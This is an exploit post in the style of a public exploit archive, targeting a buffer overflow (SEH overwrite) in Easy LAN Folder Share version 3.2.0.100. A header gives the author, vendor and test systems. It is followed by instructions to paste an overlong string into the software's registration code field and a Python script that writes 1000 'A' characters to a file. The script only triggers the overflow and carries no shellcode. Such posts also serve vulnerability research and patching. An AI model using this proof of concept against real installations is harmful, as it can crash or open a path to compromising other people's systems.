# Exploit Title: Easy LAN Folder Share Version 3.2.0.100 Buffer Overflow vulnerability(SEH)
# Date: 14-06-2013
# Exploit Author: ariarat
# Vendor Homepage: http://www.mostgear.com
# Software Link: http://download.cnet.com/Easy-LAN-Folder-Share/3000-2085_4-10909166.html
# Version: 3.2.0.100
# Tested on: [ Windows 7 & windows XP sp2,sp3]
#============================================================================================
# After creating txt file,open created file and copy the AAA... string to clipboard and
# then paste in "Register -> Activate License -> Registration Code" section.
# ** type any character in User Name text field.
#
#============================================================================================
# Contact :
#------------------
# Web Page : http://ariarat.blogspot.com
# Email    : mehdi.esmaeelpour@gmail.com
#============================================================================================

#!/usr/bin/python

filename="string.txt"
buffer = "\x41" * 1000
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()